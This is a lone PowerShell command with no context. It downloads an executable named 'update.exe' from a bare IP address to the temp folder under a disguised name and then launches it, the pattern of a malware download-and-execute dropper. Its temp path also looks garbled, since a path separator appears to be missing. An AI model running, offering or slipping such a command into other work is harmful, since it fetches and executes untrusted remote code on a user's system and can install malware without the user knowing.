(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.32/update.exe',"$env:TEMPtmpfilex86.exe");Start-Process ("$env:TEMPtmpfilex86.exe")